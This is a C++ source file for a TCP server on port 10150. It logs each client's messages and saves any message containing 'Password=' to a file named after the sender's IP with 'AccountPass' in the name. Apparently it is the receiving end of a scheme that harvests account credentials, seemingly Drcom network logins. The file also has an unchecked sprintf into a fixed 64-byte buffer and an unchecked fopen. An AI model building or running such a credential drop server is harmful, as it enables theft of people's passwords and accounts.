#include "SockJolly.h"
#include <iostream>
using namespace std;

#ifdef _WIN32
#include <Winsock2.h>
#include <process.h>
#pragma comment(lib,"ws2_32.lib")
typedef int  socklen_t;
typedef void PROC_RET_TYPE;
const int REQ_QUIT = 10054;
#else
typedef unsigned int SOCKET;
typedef void* PROC_RET_TYPE;
const int REQ_QUIT = 104;
#endif

PROC_RET_TYPE RecvProc(void *p);

const int ServerPort = 10150;
int main()
{
	SockJolly sock;
	int nRes = sock.Create(ServerPort);
	if (nRes == 0) {
		cout << "Bind Error=" << WSAGetLastError() << endl;
		return -1;
	}
	sock.Listen();
	cout << "Server Start!" << endl;
	while (true)
	{
		SockJolly *pSocka = new SockJolly;
		//sock.Accept(*pSocka, szIP, &nPort);
		sock.Accept(*pSocka);
#ifdef _WIN32
		_beginthread(RecvProc, 1024 * 1024, pSocka);
#else
		pthread_t id = 0;
		pthread_create(&id, NULL, RecvProc, pSocka);
#endif	
	}
	return 0;
}

PROC_RET_TYPE RecvProc(void *p)
{
	char szIP[20];
	UINT nPort;
	SockJolly *pSocka = (SockJolly *)p;
	pSocka->GetPeerName(szIP, nPort);
	cout << "客户端接入：" << szIP << "—" << nPort << endl;
	char sAccept[1024 * 11] = { 0 };
	char FileName[64];
	char TimeBuff[64] = { 0 };
	string str;
	int nRes;
	while ((nRes = pSocka->Receive(sAccept, sizeof(sAccept) - 1)) > 0)
	{
		sAccept[nRes] = '\0';
		str = sAccept;
		if (str.find("Password=") != string::npos) {
			pSocka->GetTime(TimeBuff);
			cout << "来自" << szIP << "的文件： " << endl << str.data() << endl;
			sprintf(FileName, "/home/Cpp_Prj_Lib/Drcom_Server/GetInfo/%s_AccountPass_%s.txt", szIP, TimeBuff);
			FILE *fp = fopen(FileName, "wb");
			fwrite(str.data(), 1, str.length(), fp);
			cout << "Write Done! : " << FileName << endl;
			fclose(fp);
		}
		else
			cout << "来自" << szIP << "的消息: " << str.data() << endl;
	}
	cout << WSAGetLastError() << endl;
	if (WSAGetLastError() == REQ_QUIT)
		cout << szIP << " 已断开连接！" << endl << endl;
}
